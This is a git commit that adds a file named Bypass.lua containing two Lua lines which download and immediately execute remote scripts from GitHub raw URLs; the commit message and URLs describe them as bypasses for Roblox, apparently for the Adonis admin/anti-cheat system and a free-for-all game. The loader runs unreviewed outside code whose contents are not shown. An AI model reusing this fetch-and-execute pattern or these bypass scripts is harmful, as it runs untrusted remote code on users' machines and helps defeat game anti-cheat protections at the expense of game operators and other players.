ad90e8d6d6154e48dd1e5c876cfe187c233e03ad
xqmt <btng2043@gmail.com>
2026-08-26 12:56:40 +0700

    Add bypass scripts for Roblox

---
+++ Bypass.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XORAWasBanned/Roblox/refs/heads/main/Scripts/Utilities%20/Bypasses/Adonis.luau", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/scripts/refs/heads/main/Bypass%20Dan%20FFA.luau", true))()
